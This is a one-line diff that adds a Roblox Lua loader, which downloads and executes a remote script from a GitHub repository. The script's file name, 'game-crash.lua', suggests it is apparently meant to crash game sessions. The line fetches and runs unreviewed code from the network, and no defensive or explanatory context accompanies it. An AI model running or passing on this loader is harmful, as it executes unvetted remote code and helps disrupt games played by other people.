@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/emirhankeles1/Darkness/raw/refs/heads/main/game-crash.lua"))()
